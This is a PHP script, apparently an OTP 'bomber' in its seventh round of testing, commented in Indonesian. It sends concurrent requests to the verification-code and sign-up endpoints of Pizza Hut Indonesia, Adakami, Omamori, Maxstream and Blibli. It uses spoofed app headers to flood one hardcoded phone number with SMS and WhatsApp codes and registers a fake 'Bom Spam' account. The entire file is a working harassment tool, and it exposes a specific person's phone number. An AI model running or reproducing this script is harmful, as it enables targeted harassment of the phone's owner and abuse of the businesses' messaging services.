<?php
// Ronde 7 (final): konfirmasi pizzahut & adakami, plus 3 kandidat sisa
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';
$R4 = (string) random_int(1000, 9999);

$REQS = [
  ['name' => 'pizzahut-2', 'm' => 'POST', 'url' => 'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
   'h' => ['Content-Type: application/json;charset=UTF-8', 'Accept: application/json', 'x-device-type: PC',
           'x-platform: WEBMOBILE', 'x-channel: 2', 'x-client-id: b39773b0-435b-4f41-80e9-163eef20e0ab',
           'x-lang: en', 'x-device-id: web', 'Origin: https://www.pizzahut.co.id', 'Referer: https://www.pizzahut.co.id/'],
   'b' => '{"email":"bom' . $R4 . '@gmail.com","first_name":"Bom","last_name":"Spam","password":"Bom++123","phone":"' . $L . '","birthday":"2000-01-02"}'],

  ['name' => 'adakami-2', 'm' => 'POST', 'url' => 'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
   'h' => ['Content-Type: application/json; charset=UTF-8', 'x-ada-appid: 800006', 'x-ada-os: android',
           'x-ada-channel: default', 'x-ada-role: 1', 'x-ada-appversion: 1.7.0', 'x-ada-model: SM-G935FD',
           'x-ada-os-ver: 7.1.1'],
   'b' => '{"ketik":0,"nomor":"' . $L . '"}', 'ua' => 'okhttp/3.8.0'],

  ['name' => 'omamori', 'm' => 'POST', 'url' => 'https://omamoriexpress.isellershop.com/services/identity/requestOTP',
   'h' => ['Content-Type: application/x-www-form-urlencoded'], 'b' => 'destination=' . $L . '&otpLength=6'],

  ['name' => 'maxstream', 'm' => 'POST', 'url' => 'https://www.maxstream.net/api/authentication/v1/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json', 'device-id: ' . $R4 . 'a1b2c3',
           'app-version: 4.4.0', 'x-app-id: 15'],
   'b' => '{"identityType":"phone","identityValue":"' . $P . '"}', 'http11' => true],

  ['name' => 'blibli-sso', 'm' => 'POST', 'url' => 'https://sso-bff.blibli.com/oauth/customers/exists?phone=' . $N . '&countryCode=62&otpChannel=WHATSAPP',
   'h' => ['Accept: application/json, text/plain, */*', 'Origin: https://www.blibli.com', 'Referer: https://www.blibli.com/'],
   'b' => ''],

  ['name' => 'blibli-otp', 'm' => 'POST', 'url' => 'https://sso-bff.blibli.com/oauth/otps?phone=' . $N . '&countryCode=62&otpChannel=WHATSAPP',
   'h' => ['Accept: application/json, text/plain, */*', 'Content-Type: application/json',
           'Origin: https://www.blibli.com', 'Referer: https://www.blibli.com/'],
   'b' => '{"phone":"' . $N . '","countryCode":"62","otpChannel":"WHATSAPP","purpose":"LOGIN"}'],
];

$mh = curl_multi_init();
$cs = [];
foreach ($REQS as $i => $r) {
  $ch = curl_init();
  $hdrs = $r['h']; $hdrs[] = 'User-Agent: ' . ($r['ua'] ?? $UA);
  curl_setopt_array($ch, [CURLOPT_URL => $r['url'], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 35, CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $r['m']]);
  if (!empty($r['http11'])) curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
  if ($r['m'] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $r['b']);
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) $errs[$idx] = curl_strerror($info['result']);
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

foreach ($REQS as $i => $r) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $flat = trim(preg_replace('/\s+/', ' ', $body));
  if (preg_match('/^\s*<(!doctype|html)/i', $flat)) $flat = '(html) ' . substr($flat, 0, 60);
  echo str_pad($r['name'], 14) . ' [' . ($code ?: '000') . '] ' . (isset($errs[$i]) ? 'GAGAL: ' . $errs[$i] : ($flat !== '' ? substr($flat, 0, 240) : '(kosong)')) . "\n";
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\n";
